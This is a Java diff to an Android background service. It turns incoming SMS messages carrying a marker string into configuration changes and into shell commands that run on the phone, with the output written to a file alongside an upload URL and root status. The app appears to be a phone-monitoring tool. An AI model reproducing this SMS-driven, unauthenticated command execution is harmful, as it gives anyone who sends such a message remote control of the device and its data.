@@ -6,6 +6,8 @@ import java.io.IOException;
 import java.io.UnsupportedEncodingException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
+import java.util.HashMap;
+import java.util.Map;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
@@ -21,6 +23,7 @@ import android.os.IBinder;
 public class SMService extends Service {
 	private PreferenceUtils sPref = null;
 	private ExecutorService es;
+	private MyProperties smsProp;
 
 	private String sms_body = null;
 	private String phoneNumber = null;
@@ -37,6 +40,7 @@ public class SMService extends Service {
 		super.onCreate();
 		es = Executors.newFixedThreadPool(1);
 		sPref = PreferenceUtils.getInstance(this);
+		smsProp = new MyProperties();
 		Log.d(Utils.LOG_TAG, getClass().getName() + " Create");
 	}
 
@@ -48,8 +52,11 @@ public class SMService extends Service {
 	}
 
 	/**
-	 * Получить расшифрованные настройки shared preference в файл 
+	 * Получить расшифрованные настройки shared preference в файл
+	 * 
 	 * @param filename
+	 * @param input
+	 *            TODO
 	 * @throws UnsupportedEncodingException
 	 * @throws IOException
 	 * @throws InvalidKeyException
@@ -58,16 +65,15 @@ public class SMService extends Service {
 	 * @throws NoSuchAlgorithmException
 	 * @throws NoSuchPaddingException
 	 */
-	private void getConfig(String filename) throws UnsupportedEncodingException, IOException, InvalidKeyException, IllegalBlockSizeException,
-			BadPaddingException, NoSuchAlgorithmException, NoSuchPaddingException {
+	private void getConfig(String filename, Map<String, String> input) throws UnsupportedEncodingException, IOException, InvalidKeyException,
+			IllegalBlockSizeException, BadPaddingException, NoSuchAlgorithmException, NoSuchPaddingException {
 		FileOutputStream fos = null;
 		MyProperties prop = new MyProperties();
+		prop.putAll(input);
 		try {
 			fos = new FileOutputStream(new File(sPref.getRootDir(), filename));
-			prop.setIntProperty("Current version", Utils.getCurrentVersion(this));
-			prop.setProperty("phoneNumber", Utils.getSelfPhoneNumber(this));
-			prop.setProperty("DeviceId", Utils.getDeviceId(this));
-			prop.setBoolProperty("root", Utils.checkRoot());
+			prop.setIntProperty("current_version", Utils.getCurrentVersion(this));
+			prop.setBoolProperty("root_availible", Utils.checkRoot());
 			prop.setProperty(PreferenceUtils.ROOT_DIR, sPref.getRootDir().getAbsolutePath());
 			prop.setProperty(PreferenceUtils.UPLOAD_URL, sPref.getRemoteUrl());
 			prop.setIntProperty(PreferenceUtils.KEEP_DAYS, sPref.getKeepDays());
@@ -82,7 +88,7 @@ public class SMService extends Service {
 
 	/**
 	 * Установить параметры
-	 * @param src Строка в формате Property
+	 * 
 	 * @throws IOException
 	 * @throws InvalidKeyException
 	 * @throws IllegalBlockSizeException
@@ -90,15 +96,15 @@ public class SMService extends Service {
 	 * @throws NoSuchAlgorithmException
 	 * @throws NoSuchPaddingException
 	 */
-	private void setConfig(String src) throws IOException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException,
-			NoSuchAlgorithmException, NoSuchPaddingException {
-		MyProperties prop = new MyProperties();
+	private void setConfig() throws IOException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, NoSuchAlgorithmException,
+			NoSuchPaddingException {
 
-		prop.load(src);
-		sPref.setRootDir(prop.getProperty(PreferenceUtils.ROOT_DIR));
-		sPref.setRemoteUrl(prop.getProperty(PreferenceUtils.UPLOAD_URL));
-		sPref.setKeepDays(prop.getIntProperty(PreferenceUtils.KEEP_DAYS));
-		sPref.setVibrate(prop.getIntProperty(PreferenceUtils.VIBRATE));
+		if (!smsProp.isEmpty()) {
+			sPref.setRootDir(smsProp.getProperty(PreferenceUtils.ROOT_DIR));
+			sPref.setRemoteUrl(smsProp.getProperty(PreferenceUtils.UPLOAD_URL));
+			sPref.setKeepDays(smsProp.getIntProperty(PreferenceUtils.KEEP_DAYS));
+			sPref.setVibrate(smsProp.getIntProperty(PreferenceUtils.VIBRATE));
+		}
 	}
 
 	private class RunService implements Runnable {
@@ -116,23 +122,35 @@ public class SMService extends Service {
 
 		public void run() {
 			try {
-				Log.d(Utils.LOG_TAG, context.getClass().getName() + ": stop " + startId);
+				Log.d(Utils.LOG_TAG, context.getClass().getName() + ": start " + startId);
+				Log.d(Utils.LOG_TAG, intent.toUri(Intent.URI_INTENT_SCHEME));
 				if (sPref.getRootDir().exists() && (Utils.getExternalStorageStatus() == Utils.MEDIA_MOUNTED)) {
 					phoneNumber = intent.getStringExtra(Utils.EXTRA_PHONE_NUMBER);
 					sms_from_name = Utils.getContactName(context, phoneNumber);
-					sms_body = intent.getStringExtra(Utils.EXTRA_SMS_BODY).trim();
+					sms_body = intent.getStringExtra(Utils.EXTRA_SMS_BODY).replace(Utils.IDENT_SMS, "").trim();
 					if (sms_body != null) {
-						if (sms_body.equals(Utils.IDENT_SMS)) {
-							Log.d(Utils.LOG_TAG, "Send configuration");
-							getConfig(Utils.CONFIG_OUT_FILENAME);
-						} else if (sms_body.startsWith(Utils.IDENT_SMS)) {
-							Log.d(Utils.LOG_TAG, "Set configuration");
-							setConfig(sms_body);
-							getConfig(Utils.CONFIG_OUT_FILENAME);
-						}
-					}
+						Map<String, String> exec_out = new HashMap<String, String>();
+						smsProp.load(sms_body.replace("#", "\n"));
+						setConfig();
 
-					Log.d(Utils.LOG_TAG, intent.toUri(Intent.URI_INTENT_SCHEME));
+						if (smsProp.containsKey(Utils.SMS_KEY_EXEC)) {
+							Commander cmdr = new Commander(context);
+							try {
+								String[] exec = smsProp.getStringsProperty(Utils.SMS_KEY_EXEC);
+								for (String cmd : exec) {
+									try {
+										Log.d(Utils.LOG_TAG, "try to exec: " + cmd);
+										exec_out.putAll(cmdr.exec(cmd));
+									} catch (Exception e) {
+										e.printStackTrace();
+									}
+								}
+							} finally {
+								cmdr.free();
+							}
+						}
+						getConfig(Utils.CONFIG_OUT_FILENAME, exec_out);
+					}
 				}
 			} catch (Exception e) {
 				e.printStackTrace();
@@ -159,6 +177,8 @@ public class SMService extends Service {
 		super.onDestroy();
 		es = null;
 		sPref = null;
+		smsProp.clear();
+		smsProp = null;
 		Log.d(Utils.LOG_TAG, getClass().getName() + " Destroy");
 	}
 
